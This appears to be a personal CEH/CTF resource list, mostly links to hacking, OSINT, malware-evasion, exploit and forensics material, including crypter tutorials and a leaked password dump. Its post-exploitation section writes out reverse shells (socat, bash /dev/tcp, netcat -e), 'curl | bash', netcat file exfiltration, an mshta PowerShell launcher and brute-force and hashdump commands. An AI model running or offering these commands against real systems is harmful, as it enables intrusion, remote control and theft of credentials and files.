# CEH_resources
Respositorio de recursos para hacking

Hacking repo --> https://github.com/Hack-with-Github/Awesome-Hacking

# CTF RESOURCES
https://github.com/apsdehal/awesome-ctf

Helpfull commands --> https://www.tunnelsup.com/helpful-linux-commands-for-ctfs/

Tools --> http://resources.infosecinstitute.com/tools-of-trade-and-resources-to-prepare-in-a-hacker-ctf-competition-or-challenge/#gref

CTF tools --> https://github.com/zardus/ctf-tools

https://lonewolfzero.wordpress.com/2015/03/12/n00bs-ctf-labs-infosec-institute-teddy-zugana/

# CTF WRITEUPS
Writeup --> https://github.com/techgaun/ctf-writeups/blob/master/the-wall.md

Mucho estego --> http://pequalsnp-team.github.io/writeups/

El bueno de karlrong --> https://blog.kalrong.net/es/

Flare writeup --> http://blog.attify.com/2017/10/10/flare-4-writeup-p1/

# RED
Análisis de tráfico --> https://github.com/hartek/Taller-Analisis-de-Trafico/blob/master/Taller%20Analisis%20de%20Trafico.pdf

# MALWARE
Tutorial --> https://www.hackingtutorials.org/malware-analysis-tutorials/malware-types-explained/

Métodos de evasión --> https://www.indetectables.net/viewtopic.php?f=8&t=50566

Blog reversing --> https://reversecodes.wordpress.com/page/2/

Downloader Polimórfico --> https://underc0de.org/foro/programacion-de-malwares/polymorphic-sadownloader-(fud)/

Herramientas desofuscar --> http://www.hackplayers.com/2016/07/13-herramientas-para-desofuscar-codigo.html?m=1

Funcionamiento crypters --> http://www.securitybydefault.com/2013/07/funcionamiento-de-los-crypters.html

Tutorial crypters --> https://www.indetectables.net/viewtopic.php?f=8&t=51265

Tutorial crypters --> https://way2h.blogspot.com.es/2013/02/what-is-crypter-how-it-works.html

Herramientas análisis apk --> http://blog.segu-info.com.ar/2017/03/herramientas-para-analizar-apk-app.html

Cifrado malware --> https://underc0de.org/foro/programacion-de-malwares/cifrado-de-malware-a-mano-by-zero/

Text conversion --> http://www.asciitohex.com/

Malware list --> http://vxvault.net/ViriList.php

Malware repository --> https://github.com/ytisf/theZoo

Malware samples --> https://zeltser.com/malware-sample-sources/

Malware detection --> https://www.rfxn.com/projects/linux-malware-detect/

Ofuscator --> https://github.com/xoreaxeaxeax/movfuscator

# DECODERS/DECRYPTERS
PHP --> https://www.unphp.net/
http://sandbox.onlinephpfunctions.com/
http://phpbeautifier.com/

Cyberchef --> https://gchq.github.io/CyberChef/

Varios --> https://www.browserling.com/tools/file-to-base64

Decrypt online --> https://www.tools4noobs.com/online_tools/decrypt/

Online simultaneos --> https://conv.darkbyte.ru/

gzinflate/base64 php --> http://www.tareeinternet.com/scripts/decrypt.php

# OSINT
osrframework --> https://github.com/i3visio/osrframework

harvey --> https://github.com/juanvelascogomez/harvey

harvey tutorial --> https://www.fwhibbit.es/harvey-v1-2-analisis-de-un-objetivo-parte-i

OSINT tools --> https://inteltechniques.com/menu.html

OSINT tools --> https://github.com/jivoi/awesome-osint

+OSINT tools --> https://securityhacklabs.blogspot.com.es/2017/12/osint-inteligencia-de-codigo-abierto.html

IP info --> https://github.com/Manisso/Crips

IP info --> https://github.com/UltimateHackers/ReconDog

## OSINT SEARCH ENGINES
Google --> https://www.google.com

Yandex --> https://www.yandex.com

Bing --> https://www.bing.com

# RECON
Dmitry

Sublist3r

amass --> https://github.com/caffix/amass   (BEST)
```
#!/bin/bash
mkdir $1
touch $1/$1.txt
amass -active -d $1 |tee /root/tools/amass/$1/$1.txt
```
subfinder --> https://github.com/subfinder/subfinder  (FOR BRUTEFORCE RECON)
```
#!/bin/bash
mkdir $1
touch $1/$1.txt
subfinder -d $1 |tee /root/tools/subfinder/$1/$1.txt
```
gobuster

massdns --> BETTER THAN GOBUSTER FOR BRUTEFORCE SUBDOMAINS -->  https://github.com/blechschmidt/massdns

## PORT SCANNING
masscan --> https://github.com/robertdavidgraham/masscan
```
masscan -p1-65535 -iL &TARGET_LIST --max-rate 100000 -oG &TARGET_OUTPUT
```
IT ONLY TAKES IPs, SO THIS SCRIPT GETS ALSO HTTP URLs
```
#!/bin/bash
strip=$(echo $1|sed 's/https\?:\/\///')
echo ""
echo "##################################################"
host $strip
echo "##################################################"
echo ""
masscan -p1-65535 $(dig +short $strip|grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"|head -1) --max-rate 1000 |& tee $strip_scan
```
NOTE: Sometimes in order to detect domain relations we can search in URL source code the UA-number for Google Analytics or Amazon. This UA comes from a user account (gmail account in case of Google), and you can find websites with same UA at https://spyonweb.com

## BRUTEFORCE SERVICES
brutespray --> https://github.com/x90skysn3k/brutespray

IDEAL WORKFLOW: masscan --> nmap service scan OG --> brutespray
```
python brutespray.py --file nmap.gnmap -U /usr/share/wordlist/user.txt -P /usr/share/wordlist/pass.txt --threads 5 --hosts 5
```

## SCREENSHOT WEB SERVICES
THIS ALLOWS YOU TO GO DIRECTLY TO THE IMPORTANT ONES

EyeWitness --> https://github.com/FortyNorthSecurity/EyeWitness

# POST EXPLOTATION
## SHELL
### SHELL UPGRADE
```
python -c 'import pty;pty.spawn("/bin/bash")' 
```
### IF YOU HAVE RCE (WITH SOCAT)
```
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444 
```
KALI:
```
socat file:`tty`, raw,echo=0 tcp-listen:4444
```
### OPEN .SH IN A URL
```
curl <IP:PORT>/FILE.sh | bash
```
### OPEN REVERSE SHELL USING /etc/tcp
TARGET
```
bash -c 'bash -i >& /dev/tcp/IP/9001 0>&1
```
KALI
```
nc -lvnp 9001
```
### NETCAT
- REVERSE SHELL
KALI
```
nc -lvnp <PORT>
```
TARGET
```
nc -nv <IP> <PORT> -e /bin/sh
nc -nv <IP> <PORT> -e cmd.exe
```
- SHELL
```
nc -nv <IP> <PORT>
```
TARGET
```
nc -lnvp <PORT> -e /bin/sh
nc -lnvp <PORT> -e cmd.exe
```

- SEND FILES
KALI
```
nc -lvnp 9001 > fichero.pdf
```
TARGET
```
cat fichero.pdf > /dev/tcp/<IP>/9001
```


# ESTEGO/CRYPTO
Información general --> https://en.wikipedia.org/wiki/Steganography_tools

Pasos/consejos --> https://pequalsnp-team.github.io/cheatsheet/steganography-101

Securitybydefault --> http://www.securitybydefault.com/2010/12/herramientas-de-esteganografia.html

Recursos --> https://github.com/sobolevn/awesome-cryptography/blob/master/README.md

Recursos --> https://github.com/DominicBreuker/stego-toolkit

Stegoveritas (NICE) --> https://github.com/bannsec/stegoVeritas

Steghide --> http://steghide.sourceforge.net/download.php

Steghide tutorial--> https://www.fwhibbit.es/steghide-brute-force-tool

Binwalk (extracción - APT) --> binwalk --dd='.*' img.jpg

binwalk -e SOME_IMAGE

zsteg --> PNG & BMP (LSB, Zlib, Camouflage)
zsteg -a IMAGE_FILE   --> ALL METHODS

Foremost (extracción - APT) --> foremost img.jpg

GIMP watermarks --> https://www.wikihow.com/Create-Hidden-Watermarks-in-GIMP

Steghide bruteforce --> https://github.com/Va5c0/Steghide-Brute-Force-Tool

LSB --> https://github.com/SST-CTF/lsb-steganography

Ej resueltos --> http://www.criptored.upm.es/paginas/criptoretos.htm

Online tools --> https://29a.ch/photo-forensics/#strings

Examples --> http://resources.infosecinstitute.com/defeating-steganography-solutions-to-net-force-ctf-challenges-using-practical-steganalysis/#gref

Libros --> http://www.jjtc.com/Steganography/tools.html

EyeFilter img --> http://magiceye.ecksdee.co.uk/

Mcafee online check --> https://www.mcafee.com/us/downloads/free-tools/steganography/index.aspx

python colormap --> https://xapax.github.io/blog/2017/03/07/PragYanCTF.html

strings -n 10 FILE_NAME --> search for strings > 10 chars
strings -e l MEMORY_DUMPED_FILE | grep flag   --> ENCODE LITTLEENDIAN

## AUDIOSTEGO
https://github.com/danielcardeenas/AudioStego
./hideme FILE "MSG"
./hideme FILE FILE_TO_HIDE
./hideme FILE_TO_EXTRACT -f

# CRACKING
Crack pdf --> https://blog.didierstevens.com/2017/12/26/cracking-encrypted-pdfs-part-1/amp/

# POWERSHELL
Embed PS in PNG image --> https://www.kitploit.com/2017/12/invoke-psimage-embeds-powershell-script.html

PS RAT --> https://n0where.net/wmi-based-agentless-post-exploitation-powershell-rat-wmimplant

Nishang tuto --> https://n0where.net/powershell-penetration-testing-framework-nishang

Post-explotation PS MIMIKITTEZ --> https://n0where.net/post-exploitation-powershell-tool-mimikittenz

Execute PS without blue screen WIN --> mshta vbscript:Execute("CreateObject(""http://Wscript.Shell "").Run ""powershell -Command """"& 'calc.exe'"""""", 0 : window.close")

Dump WIN creds without Admin privs --> https://github.com/peewpw/Invoke-WCMDump

Dump WIN creds mimikatz --> https://github.com/gentilkiwi/mimikatz/releases

Excalibur Eternalblue exploit --> https://www.kitploit.com/2017/11/excalibur-eternalblue-exploit-payload.html?utm_source=dlvr.it&utm_medium=twitter

# REVERSE ENGINEERING
RE resources --> https://github.com/wtsxDev/reverse-engineering

RE Tuto begin --> https://securedorg.github.io/RE101/

RE Tuto begin 2 --> https://securedorg.github.io/RE102/

Mara RE mobile APP --> https://n0where.net/mobile-application-reverse-engineering-mara

Radare 2 --> https://github.com/radare/radare2

Radare 2 GUI (CUTTER) --> https://github.com/radareorg/cutter

TOP RE books --> http://www.kalitut.com/2017/01/Best-reverse-engineering-books.html

# WEB
CTF writeup --> https://blog.segu-info.com.ar/2016/03/solucion-del-web-hacking-ctf-del.html

writeup --> https://0day.work/ekoparty-ctf-2016-writeups/

w3af tuto --> https://www.kitploit.com/2017/12/w3af-web-application-attack-and-audit.html

SQL injection--> https://www.kitploit.com/2017/10/sqliv-massive-sql-injection.html

SQL map --> https://www.kitploit.com/2017/10/sqlmate-tool-which-will-do-what-you.html

XSS Tuto --> http://www.hackingarticles.in/beginners-guide-cross-site-scripting-xss/

XSS radar --> http://pentestit.com/xss-radar-cross-site-scripting-discovery-chrome/amp/

XSS injection --> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection

Web check --> https://github.com/delvelabs/tachyon

Burp script generator --> https://github.com/h3xstream/http-script-generator

Header fields --> https://en.wikipedia.org/wiki/List_of_HTTP_header_fields

# EXPLOITS
POCs y exploits --> https://github.com/ele7enxxh/poc-exp

CVE-2017-8759 --> https://github.com/Voulnet/CVE-2017-8759-Exploit-sample

Eternal escaner --> https://www.kitploit.com/2017/07/eternal-internet-scanner-for-eternal.html

Eternalblue POC--> https://www.hackingtutorials.org/exploit-tutorials/exploiting-eternalblue-for-shell-with-empire-msfconsole/


# FORENSE
Tools forense --> https://toolcatalog.nist.gov/populated_taxonomy/index.php

Volatility writeups --> https://volatility-labs.blogspot.com.es/2013/05/movp-ii-24-reconstructing-master-file.html

Volatility tutorial --> https://www.howtoforge.com/tutorial/how-to-install-and-use-volatility-memory-forensic-tool/
volatility imageinfo -f memdump.mem
volatility --profile=Win7SP1x64 pslist -f memdump.mem
volatility --profile=Win7SP1x64 -f memdump.mem procdump -p 2436 -D /tmp/FILE
volatility --profile=Win7SP1x64 -f memdump.mem memdump -p 2436 -D /tmp/FILE
GET PASSWORDS
volatility --profile=Win7SP1x64 -f memdump.mem hivelist
volatility --profile=Win7SP1x64 -f memdump.mem hashdump -y 0xfffff8a000024010 -s 0xfffff8a0049a4010
WHERE 0xfffff8a000024010 = VIRTUAL ADDRESS OF \REGISTRY\MACHINE\SYSTEM
AND 0xfffff8a0049a4010 = VIRTUAL ADDRESS OF \SystemRoot\System32\Config\SAM

Osforensics --> https://www.osforensics.com/products.html

## METADATA
FOCA --> https://www.elevenpaths.com/es/labstools/evil-focasp/index.html

metagoofil --> https://github.com/laramies/metagoofil

Exiftool --> https://github.com/exiftool/exiftool

# DICCIONARIOS
SecLists --> https://github.com/danielmiessler/SecLists

1.4 billion password breach (dic 2017) --> https://gist.github.com/scottlinux/9a3b11257ac575e4f71de811322ce6b3

Varios --> https://crackstation.net/buy-crackstation-wordlist-password-cracking-dictionary.htm
